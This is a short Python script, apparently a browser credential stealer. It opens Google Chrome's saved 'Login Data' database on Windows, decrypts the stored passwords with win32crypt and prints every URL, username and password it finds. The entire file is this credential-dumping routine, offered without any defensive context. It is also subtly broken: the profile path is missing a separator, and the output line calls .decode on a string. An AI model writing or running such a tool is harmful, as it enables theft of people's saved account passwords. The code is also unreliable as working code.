import os
import sqlite3
import win32crypt


def getChrome():
    dataPath = os.path.expanduser('~') + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
    connect = sqlite3.connect(dataPath)
    cursor = connect.cursor()
    selectStatement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(selectStatement)

    loginData = cursor.fetchall()

    credential = {}
    string = ""

    for url, userName, pwd in loginData:
        pwd = win32crypt.CryptUnprotectData(pwd)
        credential[url] = (userName, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, userName, pwd[1]).decode('utf8')
        print(string)


if __name__ == '__main__':
    getChrome()
